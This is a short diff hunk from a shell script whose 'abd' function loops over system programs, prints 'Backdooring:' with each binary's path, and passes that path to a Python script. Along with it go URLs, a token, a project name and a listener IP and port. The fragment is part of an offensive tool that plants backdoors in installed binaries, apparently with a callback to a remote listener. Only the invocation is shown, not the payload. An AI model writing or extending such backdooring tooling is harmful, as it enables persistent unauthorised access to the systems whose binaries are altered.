@@ -34,7 +34,7 @@ abd() {
 	for item in ${array[*]}
 	do
 		printf "   %s\nBackdooring: " `which $item`
-		python $ABD_LOC $P_URL $P_LOC $J_URL $J_TOKEN $J_PROJECT 0 0 $L_IP $L_PORT
+		python $ABD_LOC `which $item` $P_URL $P_LOC $J_URL $J_TOKEN $J_PROJECT 0 0 $L_IP $L_PORT
 	done
 }
 
